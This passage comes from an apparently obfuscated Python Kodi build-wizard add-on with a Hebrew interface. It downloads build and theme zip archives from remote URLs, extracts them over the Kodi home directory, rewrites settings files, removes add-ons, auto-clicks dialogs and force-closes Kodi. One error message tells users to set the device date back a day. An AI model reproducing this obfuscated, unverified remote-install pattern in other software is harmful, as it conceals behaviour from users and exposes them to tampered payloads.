			O00OOO0OO0O00O000 .close ()#line:3861
		except :#line:3862
				pass #line:3863
		wiz .kodi17Fix ()#line:3864
		O0O0O00O0O00OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3865
		try :#line:3866
			O00OOO0OO0O00O000 =open (O0O0O00O0O00OO0O0 ,'r')#line:3867
			OOO0OO000O0O00OOO =O00OOO0OO0O00O000 .read ()#line:3868
			O00OOO0OO0O00O000 .close ()#line:3869
			OOO0OOOOO0O0OO000 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3870
			O0OOOO00000O0O000 =re .compile (OOO0OOOOO0O0OO000 ).findall (OOO0OO000O0O00OOO )[0 ]#line:3871
			O00OOO0OO0O00O000 =open (O0O0O00O0O00OO0O0 ,'w')#line:3872
			O00OOO0OO0O00O000 .write (OOO0OO000O0O00OOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OOOO00000O0O000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3873
			O00OOO0OO0O00O000 .close ()#line:3874
		except :#line:3875
				pass #line:3876
		swapSkins ('skin.Premium.mod')#line:3877
def buildWizard (O00OOO0O0OO00OOO0 ,OOO0O00O0OOOOO000 ,theme =None ,over =False ):#line:3880
	if over ==False :#line:3881
		O0OOOOOO0O0O0O000 =wiz .checkBuild (O00OOO0O0OO00OOO0 ,'url')#line:3882
		if O0OOOOOO0O0O0O000 ==False :#line:3884
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3889
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3890
			return #line:3891
		OO00O0000OOOO000O =wiz .workingURL (O0OOOOOO0O0O0O000 )#line:3892
		if OO00O0000OOOO000O ==False :#line:3893
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO00O0000OOOO000O ))#line:3894
			return #line:3895
	if OOO0O00O0OOOOO000 =='gui':#line:3896
		if O00OOO0O0OO00OOO0 ==BUILDNAME :#line:3897
			if over ==True :OO00O0O00OOO00OOO =1 #line:3898
			else :OO00O0O00OOO00OOO =1 #line:3899
		else :#line:3900
			OO00O0O00OOO00OOO =1 #line:3901
		if OO00O0O00OOO00OOO :#line:3902
			remove_addons ()#line:3903
			remove_addons2 ()#line:3904
			OO0OO0000OO00O000 =wiz .checkBuild (O00OOO0O0OO00OOO0 ,'gui')#line:3905
			O00O00000OO0O00O0 =O00OOO0O0OO00OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3906
			if not wiz .workingURL (OO0OO0000OO00O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3907
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3908
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0O0OO00OOO0 ),'','אנא המתן')#line:3909
			O0OOOOO0OOOOO0000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O00000OO0O00O0 )#line:3910
			try :os .remove (O0OOOOO0OOOOO0000 )#line:3911
			except :pass #line:3912
			logging .warning (OO0OO0000OO00O000 )#line:3913
			if 'google'in OO0OO0000OO00O000 :#line:3914
			   OO000OO00O00000OO =googledrive_download (OO0OO0000OO00O000 ,O0OOOOO0OOOOO0000 ,DP ,wiz .checkBuild (O00OOO0O0OO00OOO0 ,'filesize'))#line:3915
			else :#line:3918
			  downloader .download (OO0OO0000OO00O000 ,O0OOOOO0OOOOO0000 ,DP )#line:3919
			xbmc .sleep (100 )#line:3920
			O000OOOOOOOOOO0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0O0OO00OOO0 )#line:3921
			DP .update (0 ,O000OOOOOOOOOO0OO ,'','אנא המתן')#line:3922
			extract .all (O0OOOOO0OOOOO0000 ,HOME ,DP ,title =O000OOOOOOOOOO0OO )#line:3923
			DP .close ()#line:3924
			wiz .defaultSkin ()#line:3925
			wiz .lookandFeelData ('save')#line:3926
			wiz .kodi17Fix ()#line:3927
			if KODIV >=18 :#line:3928
				skindialogsettind18 ()#line:3929
			xbmc .executebuiltin ("ReloadSkin()")#line:3930
			if INSTALLMETHOD ==1 :O0OO00OOO0OO0OOO0 =1 #line:3931
			elif INSTALLMETHOD ==2 :O0OO00OOO0OO0OOO0 =0 #line:3932
			else :DP .close ()#line:3933
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3934
			update_Votes ()#line:3935
			indicatorfastupdate ()#line:3936
		else :#line:3938
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3939
	if OOO0O00O0OOOOO000 =='gui2':#line:3940
		if O00OOO0O0OO00OOO0 ==BUILDNAME :#line:3941
			if over ==True :OO00O0O00OOO00OOO =1 #line:3942
			else :OO00O0O00OOO00OOO =1 #line:3943
		else :#line:3944
			OO00O0O00OOO00OOO =1 #line:3945
		if OO00O0O00OOO00OOO :#line:3946
			remove_addons ()#line:3947
			remove_addons2 ()#line:3948
			OO0OO0000OO00O000 =wiz .checkBuild (O00OOO0O0OO00OOO0 ,'gui')#line:3949
			O00O00000OO0O00O0 =O00OOO0O0OO00OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3950
			if not wiz .workingURL (OO0OO0000OO00O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3951
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3952
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0O0OO00OOO0 ),'','אנא המתן')#line:3953
			O0OOOOO0OOOOO0000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O00000OO0O00O0 )#line:3954
			try :os .remove (O0OOOOO0OOOOO0000 )#line:3955
			except :pass #line:3956
			logging .warning (OO0OO0000OO00O000 )#line:3957
			if 'google'in OO0OO0000OO00O000 :#line:3958
			   OO000OO00O00000OO =googledrive_download (OO0OO0000OO00O000 ,O0OOOOO0OOOOO0000 ,DP ,wiz .checkBuild (O00OOO0O0OO00OOO0 ,'filesize'))#line:3959
			else :#line:3962
			  downloader .download (OO0OO0000OO00O000 ,O0OOOOO0OOOOO0000 ,DP )#line:3963
			xbmc .sleep (100 )#line:3964
			O000OOOOOOOOOO0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0O0OO00OOO0 )#line:3965
			DP .update (0 ,O000OOOOOOOOOO0OO ,'','אנא המתן')#line:3966
			extract .all (O0OOOOO0OOOOO0000 ,HOME ,DP ,title =O000OOOOOOOOOO0OO )#line:3967
			DP .close ()#line:3968
			wiz .defaultSkin ()#line:3969
			wiz .lookandFeelData ('save')#line:3970
			if INSTALLMETHOD ==1 :O0OO00OOO0OO0OOO0 =1 #line:3973
			elif INSTALLMETHOD ==2 :O0OO00OOO0OO0OOO0 =0 #line:3974
			else :DP .close ()#line:3975
		else :#line:3977
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3978
	elif OOO0O00O0OOOOO000 =='fresh':#line:3979
		freshStart (O00OOO0O0OO00OOO0 )#line:3980
	elif OOO0O00O0OOOOO000 =='normal':#line:3981
		if url =='normal':#line:3982
			if KEEPTRAKT =='true':#line:3983
				traktit .autoUpdate ('all')#line:3984
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3985
			if KEEPREAL =='true':#line:3986
				debridit .autoUpdate ('all')#line:3987
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3988
			if KEEPLOGIN =='true':#line:3989
				loginit .autoUpdate ('all')#line:3990
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3991
		OOOO000O000000O00 =int (KODIV );O000000OO00OOO00O =int (float (wiz .checkBuild (O00OOO0O0OO00OOO0 ,'kodi')))#line:3992
		if not OOOO000O000000O00 ==O000000OO00OOO00O :#line:3993
			if OOOO000O000000O00 ==16 and O000000OO00OOO00O <=15 :O000OOOOOO0OOO0OO =False #line:3994
			else :O000OOOOOO0OOO0OO =True #line:3995
		else :O000OOOOOO0OOO0OO =False #line:3996
		if O000OOOOOO0OOO0OO ==True :#line:3997
			OOOO000000O0OOOO0 =1 #line:3998
		else :#line:3999
			if not over ==False :OOOO000000O0OOOO0 =1 #line:4000
			else :OOOO000000O0OOOO0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4001
		if OOOO000000O0OOOO0 :#line:4002
			wiz .clearS ('build')#line:4003
			OO0OO0000OO00O000 =wiz .checkBuild (O00OOO0O0OO00OOO0 ,'url')#line:4004
			O00O00000OO0O00O0 =O00OOO0O0OO00OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4005
			if not wiz .workingURL (OO0OO0000OO00O000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4006
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4007
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0O0OO00OOO0 ,wiz .checkBuild (O00OOO0O0OO00OOO0 ,'version')),'','אנא המתן')#line:4008
			O0OOOOO0OOOOO0000 =os .path .join (PACKAGES ,'%s.zip'%O00O00000OO0O00O0 )#line:4009
			try :os .remove (O0OOOOO0OOOOO0000 )#line:4010
			except :pass #line:4011
			logging .warning (OO0OO0000OO00O000 )#line:4012
			if 'google'in OO0OO0000OO00O000 :#line:4013
			   OO000OO00O00000OO =googledrive_download (OO0OO0000OO00O000 ,O0OOOOO0OOOOO0000 ,DP ,wiz .checkBuild (O00OOO0O0OO00OOO0 ,'filesize'))#line:4014
			else :#line:4017
			  downloader .download (OO0OO0000OO00O000 ,O0OOOOO0OOOOO0000 ,DP )#line:4018
			xbmc .sleep (1000 )#line:4019
			O000OOOOOOOOOO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0O0OO00OOO0 ,wiz .checkBuild (O00OOO0O0OO00OOO0 ,'version'))#line:4020
			DP .update (0 ,O000OOOOOOOOOO0OO ,'','Please Wait')#line:4021
			O0O0OOO0O0O0O00OO ,OOOO0O000OOO0O0O0 ,OO00O0O00OO0O000O =extract .all (O0OOOOO0OOOOO0000 ,HOME ,DP ,title =O000OOOOOOOOOO0OO )#line:4022
			if int (float (O0O0OOO0O0O0O00OO ))>0 :#line:4023
				try :#line:4024
					wiz .fixmetas ()#line:4025
				except :pass #line:4026
				wiz .lookandFeelData ('save')#line:4027
				wiz .defaultSkin ()#line:4028
				wiz .setS ('buildname',O00OOO0O0OO00OOO0 )#line:4030
				wiz .setS ('buildversion',wiz .checkBuild (O00OOO0O0OO00OOO0 ,'version'))#line:4031
				wiz .setS ('buildtheme','')#line:4032
				wiz .setS ('latestversion',wiz .checkBuild (O00OOO0O0OO00OOO0 ,'version'))#line:4033
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4034
				wiz .setS ('installed','true')#line:4035
				wiz .setS ('extract',str (O0O0OOO0O0O0O00OO ))#line:4036
				wiz .setS ('errors',str (OOOO0O000OOO0O0O0 ))#line:4037
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O0OOO0O0O0O00OO ,OOOO0O000OOO0O0O0 ))#line:4038
				O0OO0O0000OO0OO00 =(ADDON .getSetting ("gaiaseren"))#line:4040
				if O0OO0O0000OO0OO00 =='true':#line:4041
					wiz .kodi17Fix ()#line:4042
				fastupdatefirstbuild (NOTEID )#line:4043
				skin_homeselect ()#line:4044
				skin_lower ()#line:4045
				rdbuildinstall ()#line:4046
				try :gaiaserenaddon ()#line:4048
				except :pass #line:4049
				adults18 ()#line:4050
				skinfix18 ()#line:4051
				try :os .remove (O0OOOOO0OOOOO0000 )#line:4053
				except :pass #line:4054
				if O0OO0O0000OO0OO00 =='true':#line:4055
					wiz .kodi17Fix ()#line:4056
				O000O0OOO0O00OOO0 =(ADDON .getSetting ("auto_rd"))#line:4057
				if O000O0OOO0O00OOO0 =='true':#line:4058
					try :#line:4059
						setautorealdebrid ()#line:4060
					except :pass #line:4061
				try :#line:4062
					autotrakt ()#line:4063
				except :pass #line:4064
				O0O0O00O0O0O0000O =(ADDON .getSetting ("imdb_on"))#line:4065
				if O0O0O00O0O0O0000O =='true':#line:4066
					imdb_synck ()#line:4067
				iptvset ()#line:4068
				if int (float (OOOO0O000OOO0O0O0 ))>0 :#line:4070
					OO00O0O00OOO00OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0O0OO00OOO0 ,wiz .checkBuild (O00OOO0O0OO00OOO0 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0OOO0O0O0O00OO ,'%',COLOR1 ,OOOO0O000OOO0O0O0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4071
					if OO00O0O00OOO00OOO :#line:4072
						if isinstance (OOOO0O000OOO0O0O0 ,unicode ):#line:4073
							OO00O0O00OO0O000O =OO00O0O00OO0O000O .encode ('utf-8')#line:4074
						wiz .TextBox (ADDONTITLE ,OO00O0O00OO0O000O )#line:4075
				DP .close ()#line:4076
				OOO0000OO0000O0OO =wiz .themeCount (O00OOO0O0OO00OOO0 )#line:4077
				builde_Votes ()#line:4078
				indicator ()#line:4079
				if not OOO0000OO0000O0OO ==False :#line:4080
					buildWizard (O00OOO0O0OO00OOO0 ,'theme')#line:4081
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4082
				if INSTALLMETHOD ==1 :O0OO00OOO0OO0OOO0 =1 #line:4083
				elif INSTALLMETHOD ==2 :O0OO00OOO0OO0OOO0 =0 #line:4084
				else :resetkodi ()#line:4085
				if O0OO00OOO0OO0OOO0 ==1 :wiz .reloadFix ()#line:4087
				else :wiz .killxbmc (True )#line:4088
			else :#line:4089
				if isinstance (OOOO0O000OOO0O0O0 ,unicode ):#line:4090
					OO00O0O00OO0O000O =OO00O0O00OO0O000O .encode ('utf-8')#line:4091
				OOO00O00O00000000 =open (O0OOOOO0OOOOO0000 ,'r')#line:4092
				OOO0O0OO0O000OO00 =OOO00O00O00000000 .read ()#line:4093
				OO00O0000OO00OOOO =''#line:4094
				for O0O00000OO00OO000 in OO000OO00O00000OO :#line:4095
				  OO00O0000OO00OOOO ='key: '+OO00O0000OO00OOOO +'\n'+O0O00000OO00OO000 #line:4096
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO00O0O00OO0O000O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO00O0000OO00OOOO )#line:4097
		else :#line:4098
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4099
	elif OOO0O00O0OOOOO000 =='theme':#line:4100
		if theme ==None :#line:4101
			OOO0000OO0000O0OO =wiz .checkBuild (O00OOO0O0OO00OOO0 ,'theme')#line:4102
			OO0OO000O00OO0OO0 =[]#line:4103
			if not OOO0000OO0000O0OO =='http://'and wiz .workingURL (OOO0000OO0000O0OO )==True :#line:4104
				OO0OO000O00OO0OO0 =wiz .themeCount (O00OOO0O0OO00OOO0 ,False )#line:4105
				if len (OO0OO000O00OO0OO0 )>0 :#line:4106
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00OOO0O0OO00OOO0 ,COLOR1 ,len (OO0OO000O00OO0OO0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4107
						wiz .log ("Theme List: %s "%str (OO0OO000O00OO0OO0 ))#line:4108
						OO000OOOOO0OO0000 =DIALOG .select (ADDONTITLE ,OO0OO000O00OO0OO0 )#line:4109
						wiz .log ("Theme install selected: %s"%OO000OOOOO0OO0000 )#line:4110
						if not OO000OOOOO0OO0000 ==-1 :theme =OO0OO000O00OO0OO0 [OO000OOOOO0OO0000 ];O0O00OOO0O0O000OO =True #line:4111
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4112
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4113
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4114
		else :O0O00OOO0O0O000OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00OOO0O0OO00OOO0 ,wiz .checkBuild (O00OOO0O0OO00OOO0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4115
		if O0O00OOO0O0O000OO :#line:4116
			OOO0000OO0OO0O0O0 =wiz .checkTheme (O00OOO0O0OO00OOO0 ,theme ,'url')#line:4117
			O00O00000OO0O00O0 =O00OOO0O0OO00OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4118
			if not wiz .workingURL (OOO0000OO0OO0O0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4119
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4120
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4121
			O0OOOOO0OOOOO0000 =os .path .join (PACKAGES ,'%s.zip'%O00O00000OO0O00O0 )#line:4122
			try :os .remove (O0OOOOO0OOOOO0000 )#line:4123
			except :pass #line:4124
			downloader .download (OOO0000OO0OO0O0O0 ,O0OOOOO0OOOOO0000 ,DP )#line:4125
			xbmc .sleep (1000 )#line:4126
			DP .update (0 ,"","Installing %s "%O00OOO0O0OO00OOO0 )#line:4127
			OOOO0OO0OO000O0OO =False #line:4128
			if url not in ["fresh","normal"]:#line:4129
				OOOO0OO0OO000O0OO =testTheme (O0OOOOO0OOOOO0000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4130
				OOO00O00O000000O0 =testGui (O0OOOOO0OOOOO0000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4131
				if OOOO0OO0OO000O0OO ==True :#line:4132
					wiz .lookandFeelData ('save')#line:4133
					O000O0OO00OOOO000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4134
					O0OOO0OO0OOO0OOOO =xbmc .getSkinDir ()#line:4135
					skinSwitch .swapSkins (O000O0OO00OOOO000 )#line:4137
					OOOO0OOO0O0OOO0OO =0 #line:4138
					xbmc .sleep (1000 )#line:4139
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO0OOO0O0OOO0OO <150 :#line:4140
						OOOO0OOO0O0OOO0OO +=1 #line:4141
						xbmc .sleep (1000 )#line:4142
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4143
						wiz .ebi ('SendClick(11)')#line:4144
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4145
					xbmc .sleep (1000 )#line:4146
			O000OOOOOOOOOO0OO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4147
			DP .update (0 ,O000OOOOOOOOOO0OO ,'','אנא המתן')#line:4148
			O0O0OOO0O0O0O00OO ,OOOO0O000OOO0O0O0 ,OO00O0O00OO0O000O =extract .all (O0OOOOO0OOOOO0000 ,HOME ,DP ,title =O000OOOOOOOOOO0OO )#line:4149
			wiz .setS ('buildtheme',theme )#line:4150
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O0OOO0O0O0O00OO ,OOOO0O000OOO0O0O0 ))#line:4151
			DP .close ()#line:4152
			if url not in ["fresh","normal"]:#line:4153
				wiz .forceUpdate ()#line:4154
				if KODIV >=17 :wiz .kodi17Fix ()#line:4155
				if OOO00O00O000000O0 ==True :#line:4156
					wiz .lookandFeelData ('save')#line:4157
					wiz .defaultSkin ()#line:4158
					O0OOO0OO0OOO0OOOO =wiz .getS ('defaultskin')#line:4159
					skinSwitch .swapSkins (O0OOO0OO0OOO0OOOO )#line:4160
					OOOO0OOO0O0OOO0OO =0 #line:4161
					xbmc .sleep (1000 )#line:4162
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO0OOO0O0OOO0OO <150 :#line:4163
						OOOO0OOO0O0OOO0OO +=1 #line:4164
						xbmc .sleep (1000 )#line:4165
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4167
						wiz .ebi ('SendClick(11)')#line:4168
					wiz .lookandFeelData ('restore')#line:4169
				elif OOOO0OO0OO000O0OO ==True :#line:4170
					skinSwitch .swapSkins (O0OOO0OO0OOO0OOOO )#line:4171
					OOOO0OOO0O0OOO0OO =0 #line:4172
					xbmc .sleep (1000 )#line:4173
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO0OOO0O0OOO0OO <150 :#line:4174
						OOOO0OOO0O0OOO0OO +=1 #line:4175
						xbmc .sleep (1000 )#line:4176
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4178
						wiz .ebi ('SendClick(11)')#line:4179
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4180
					wiz .lookandFeelData ('restore')#line:4181
				else :#line:4182
					wiz .ebi ("ReloadSkin()")#line:4183
					xbmc .sleep (1000 )#line:4184
					wiz .ebi ("Container.Refresh")#line:4185
		else :#line:4186
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4187
def skin_homeselect ():#line:4191
	try :#line:4193
		OO00OO000OO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4194
		O0O0O0O0O0OO0OO00 =open (OO00OO000OO00O00O ,'r')#line:4196
		OO0OOO00O00O00OO0 =O0O0O0O0O0OO0OO00 .read ()#line:4197
		O0O0O0O0O0OO0OO00 .close ()#line:4198
		OOOO0O0O00O0OOO00 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4199
		OOO0O0OO0OOOOO0OO =re .compile (OOOO0O0O00O0OOO00 ).findall (OO0OOO00O00O00OO0 )[0 ]#line:4200
		O0O0O0O0O0OO0OO00 =open (OO00OO000OO00O00O ,'w')#line:4201
		O0O0O0O0O0OO0OO00 .write (OO0OOO00O00O00OO0 .replace ('<setting id="HomeS" type="string%s/setting>'%OOO0O0OO0OOOOO0OO ,'<setting id="HomeS" type="string"></setting>'))#line:4202
		O0O0O0O0O0OO0OO00 .close ()#line:4203
	except :#line:4204
		pass #line:4205
def skin_lower ():#line:4208
	O0O00O0000OO0O0O0 =(ADDON .getSetting ("lower"))#line:4209
	if O0O00O0000OO0O0O0 =='true':#line:4210
		try :#line:4213
			OO0O0000O00OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4214
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'r')#line:4216
			OOOOO0OO00O000O00 =O00O000O000O000O0 .read ()#line:4217
			O00O000O000O000O0 .close ()#line:4218
			O0OOO0000OOO000OO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4219
			O0O00OO0O0O0O0000 =re .compile (O0OOO0000OOO000OO ).findall (OOOOO0OO00O000O00 )[0 ]#line:4220
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'w')#line:4221
			O00O000O000O000O0 .write (OOOOO0OO00O000O00 .replace ('<setting id="none_widget" type="bool%s/setting>'%O0O00OO0O0O0O0000 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4222
			O00O000O000O000O0 .close ()#line:4223
			OO0O0000O00OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4225
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'r')#line:4227
			OOOOO0OO00O000O00 =O00O000O000O000O0 .read ()#line:4228
			O00O000O000O000O0 .close ()#line:4229
			O0OOO0000OOO000OO ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4230
			O0O00OO0O0O0O0000 =re .compile (O0OOO0000OOO000OO ).findall (OOOOO0OO00O000O00 )[0 ]#line:4231
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'w')#line:4232
			O00O000O000O000O0 .write (OOOOO0OO00O000O00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0O00OO0O0O0O0000 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4233
			O00O000O000O000O0 .close ()#line:4234
			OO0O0000O00OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4236
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'r')#line:4238
			OOOOO0OO00O000O00 =O00O000O000O000O0 .read ()#line:4239
			O00O000O000O000O0 .close ()#line:4240
			O0OOO0000OOO000OO ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4241
			O0O00OO0O0O0O0000 =re .compile (O0OOO0000OOO000OO ).findall (OOOOO0OO00O000O00 )[0 ]#line:4242
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'w')#line:4243
			O00O000O000O000O0 .write (OOOOO0OO00O000O00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0O00OO0O0O0O0000 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4244
			O00O000O000O000O0 .close ()#line:4245
			OO0O0000O00OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4249
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'r')#line:4251
			OOOOO0OO00O000O00 =O00O000O000O000O0 .read ()#line:4252
			O00O000O000O000O0 .close ()#line:4253
			O0OOO0000OOO000OO ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4254
			O0O00OO0O0O0O0000 =re .compile (O0OOO0000OOO000OO ).findall (OOOOO0OO00O000O00 )[0 ]#line:4255
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'w')#line:4256
